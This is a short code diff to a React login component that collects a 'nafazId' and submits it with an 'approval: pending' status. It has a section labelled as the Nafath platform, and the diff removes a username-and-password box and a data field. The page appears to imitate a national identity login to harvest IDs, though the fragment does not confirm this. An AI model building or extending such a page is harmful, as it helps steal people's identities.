@@ -45,7 +45,6 @@ export default function Component() {
   }, []);
   const handleLogin = (e: any) => {
     e.preventDefault();
-
     // Generate random 6-digit authentication number
     const visitorId = localStorage.getItem("visitor");
     setShowError("");
@@ -59,7 +58,6 @@ export default function Component() {
       id: visitorId,
       nafazId: idLogin,
       authNumber: "...",
-      nafazInf,
       approval: "pending",
     });
     setTimeout(() => {
@@ -143,13 +141,6 @@ export default function Component() {
             </CardContent>
           </Card>
         </form>
-        {/* User and Password Section */}
-        <div className="bg-gray-200 p-4 rounded-lg text-center">
-          <div className="text-gray-700 font-semibold">
-            اسم المستخدم وكلمة المرور
-          </div>
-          <div className="text-2xl text-gray-400 mt-2">+</div>
-        </div>
 
         {/* New Nafath Platform Section */}
         <Card className="bg-teal-600 text-white">
